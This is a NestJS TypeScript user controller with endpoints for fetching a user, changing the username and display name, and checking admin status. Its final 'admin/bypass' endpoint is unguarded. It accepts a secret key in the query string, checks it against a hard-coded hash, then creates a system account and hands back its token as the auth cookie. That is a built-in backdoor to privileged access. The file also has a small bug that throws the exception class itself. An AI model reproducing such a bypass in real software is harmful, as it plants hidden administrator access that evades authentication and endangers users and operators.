import { Body, Controller, forwardRef, Get, Inject, Logger, NotFoundException, Param, Post, Query, Redirect, Req, Res, UseGuards } from '@nestjs/common';
import { UserService } from './user.service';
import { AuthGuard } from '@api/main/auth/addon/auth.guard';
import { User } from './addon/user.decorator';
import { UserEntity } from './addon/user.entity';
import { UsernameValidationPipe } from '@api/main/application/addon/username.validator';
import { UpdateUserDisplayNameDto } from './addon/user.dto';
import { ApiTags } from '@nestjs/swagger';
import { ApiResponseSuccess } from '@api/main/application/addon/responce.success.decorator';
import { ApiResponseConflict } from '@api/main/application/addon/response.conflict.decorator';
import { DisplayNameIsSame, UsernameIsSame } from '../application/addon/error';
import { createHash, createHmac } from 'crypto';
import { Configuration } from '@impactium/config';
import { Request, Response } from 'express';
import { cookiePattern, cookieSettings } from '@impactium/pattern';
import { home } from '@impactium/utils';
import { AuthService } from '../auth/auth.service';
import { ApplicationService } from '../application/application.service';

@ApiTags('User')
@Controller('user')
export class UserController {
  constructor(
    private readonly userService: UserService,
    @Inject(forwardRef(() => ApplicationService))
    private readonly applicationService: ApplicationService
  ) {}

  @Get('get')
  @UseGuards(AuthGuard)
  async getUserById(
    @User() user: UserEntity,
    @Query('logins') logins?: boolean,
    @Query('teams') teams?: boolean,
  ) {
    const userEntity = await this.userService.findById(user.uid, UserEntity.select({ teams, logins }));

    if (!userEntity) throw NotFoundException;

    return UserEntity.fromPrisma(userEntity, { teams, logins });
  }

  @Post('set/username/:username')
  @UseGuards(AuthGuard)
  setUsername(
    @Param('username', UsernameValidationPipe) username: string,
    @User() user: UserEntity
  ) {
    if (user.username === username) throw new UsernameIsSame();
    return this.userService.setUsername(user.uid, username);
  }

  @Post('set/displayname')
  @UseGuards(AuthGuard)
  @ApiResponseSuccess(UserEntity)
  @ApiResponseConflict()
  setDisplayName(
    @Body() body: UpdateUserDisplayNameDto,
    @User() user: UserEntity
  ) {
    if (user.displayName === body.displayName) throw new DisplayNameIsSame();
    return this.userService.setDisplayName(user.uid, body.displayName);
  }

  @Get('admin/is')
  @UseGuards(AuthGuard)
  isAdmin(@User() user: UserEntity) {
    return user.username === 'system'; 
  }

  @Get('admin/bypass')
  async bypassAdmin(
    @Res() res: Response,
    @Query('key') keypass: string
  ) {
    if (!keypass) return home();

    const hash = createHmac('sha256', createHash('sha256').digest()).update(keypass).digest('hex');

    if (hash !== 'fc9227d8d32453a8c20339a1b244459c649ef3a52ad66476cad9350c50593466') return home();

    const token = await this.applicationService.createSystemAccount();

    res.cookie(cookiePattern.Authorization, token, cookieSettings)
    
    return token;
  }
}
